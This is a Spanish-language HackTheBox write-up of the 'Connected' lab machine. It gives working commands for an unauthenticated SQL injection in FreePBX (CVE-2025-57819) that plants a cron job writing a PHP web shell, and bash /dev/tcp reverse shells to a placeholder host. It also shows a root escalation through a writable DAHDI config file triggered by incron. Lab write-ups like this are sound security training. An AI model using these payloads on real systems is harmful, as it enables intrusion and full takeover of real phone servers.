---
created: 2026-6-11
description: Connected es una máquina Linux que ejecuta FreePBX, vulnerable a una inyección SQL sin autenticación en CVE-2025-57819. La vulnerabilidad se explota para inyectar una tarea cron maliciosa y obtener ejecución remota de código. La escalada de privilegios implica abusar de un archivo de configuración escribible monitorizado por incron, lo que permite ejecutar comandos como root cuando el servicio DAHDI se reinicia.
---

#easy #htb #linux #web #freepbx #cve-2025-57819 #sqli #cron #rce #writable-config #incron
# Enumeración
## Nmap

```bash
[hvidal@fedora] ~/d/h/h/m/c/scan
❯ sudo nmap -p- --open -vvv --min-rate 5000 -n -Pn 10.129.245.100 -oG scan
Discovered open port 22/tcp on 10.129.245.100
Discovered open port 80/tcp on 10.129.245.100
Discovered open port 443/tcp on 10.129.245.100
```

Puertos abiertos: 80, 22, 443
```bash
[hvidal@fedora] ~/d/h/h/m/c/scan
❯ nmap -p 22,80,443 -sCV 10.129.245.100 -oN portscan.txt -Pn
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS)
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS)
```

Añadir `connected.htb` a `/etc/hosts`.
```bash
[hvidal@fedora] ~/d/h/h/m/f/scan
❯ echo "10.129.245.100 connected.htb" | sudo tee -a /etc/hosts
```

## FreePBX
La aplicación ejecuta `FreePBX 16.0.40.7`, que es vulnerable a [CVE-2025-57819](https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE)

# Explotación
La versión instalada de `FreePBX` es vulnerable a una inyección SQL sin autenticación a través del parámetro `brand` del endpoint `admin/ajax.php`.
Debido a una validación de entrada incorrecta, un atacante puede inyectar sentencias SQL arbitrarias en la base de datos, lo que permite modificar tablas internas como `cron_jobs`.

## Inyección SQL

Insertar una tarea que cree un archivo `php` malicioso que permita la ejecución remota de código.

Codificar el payload en `Base64`.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ echo "<?php system($_GET['cmd']); ?>" | base64
PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==
```

Crear la tarea `cron` maliciosa.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ curl -X POST "http://connected.htb/admin/ajax.php?module=FreePBX\\modules\\endpoint\\ajax&command=model&template=x&model=model" \
    --data-urlencode "brand=x';INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','wt-shell','echo PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==|base64 -d > /var/www/html/wt-shell.php',NULL,'* * * * *',30,1,1)-- "
```
La petición devuelve un error porque el SQL inyectado rompe la consulta original. Sin embargo, la sentencia maliciosa se ejecuta correctamente.
## Obtención de una shell

Iniciar un listener.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ nc -lnvp 4444
```

Esperar a que la tarea `cron` cree el archivo `php` malicioso y ejecutar una reverse shell.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ curl -ik "https://connected.htb/wt-shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/IP/4444+0>%261'"
```

# Escalada de privilegios

## Enumeración

Buscar los archivos de configuración escribibles.
```bash
[asterisk@connected]$ find /etc -writable 2>/dev/null | grep -v "/etc/wanpipe\|/etc/asterisk\|/etc/schmooze" | head -20
/etc/dahdi/init.conf
```

Comprobar la configuración de `incron`.
```bash
[asterisk@connected]$ cat /etc/incron.d/legacy
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

Si modificamos `/var/spool/asterisk/sysadmin/dahdi_restart`, el servicio `dahdi` se reinicia y ejecuta `/etc/dahdi/init.conf`, que es un archivo escribible.
## Explotación

Sobrescribir `/etc/dahdi/init.conf` con un payload de reverse shell.
```bash
[asterisk@connected]$ echo "bash -i >& /dev/tcp/IP/4445 0>&1" > /etc/dahdi/init.conf
```

Iniciar un listener.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ nc -nlvp 4445
```

Modificar `/var/spool/asterisk/sysadmin/dahdi_restart` para reiniciar `dahdi`.
```bash
[asterisk@connected]$ echo "something" > /var/spool/asterisk/sysadmin/dahdi_restart
```
Una vez que el servicio se reinicia, el payload se ejecuta con privilegios de root, lo que da como resultado una shell de root.

Leer la flag de root.
```txt
[root@connected]# cat /root/root.txt
```